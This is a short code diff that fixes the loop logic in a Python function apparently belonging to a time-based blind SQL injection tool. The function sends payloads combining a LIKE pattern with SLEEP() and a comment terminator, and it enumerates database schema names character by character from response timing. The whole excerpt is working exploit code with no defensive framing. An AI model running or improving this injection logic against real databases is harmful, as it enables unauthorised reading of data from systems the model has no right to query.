@@ -33,8 +33,8 @@ def fetch_schema():
         if run_payload(temp_payload):
             print(f'fetch_schema:run_payload:payload: {temp_payload}')
             schema_name = character
-            temp_schema_name = schema_name
             while True:
+                temp_schema_name = schema_name
                 for try_character in CHARACTER_SET:
                     temp_payload = payload + f'"{schema_name}{try_character}%" ' + 'AND ' + f'SLEEP({ARBITARY_SLEEP_TIME}) -- '
                     # Gracefully sleep for a while
@@ -46,6 +46,7 @@ def fetch_schema():
                 if schema_name == temp_schema_name:
                     print(f'Schema found in wild {schema_name}')
                     schema_list.append(schema_name)
+                    break
     return schema_list
 
 # TODO
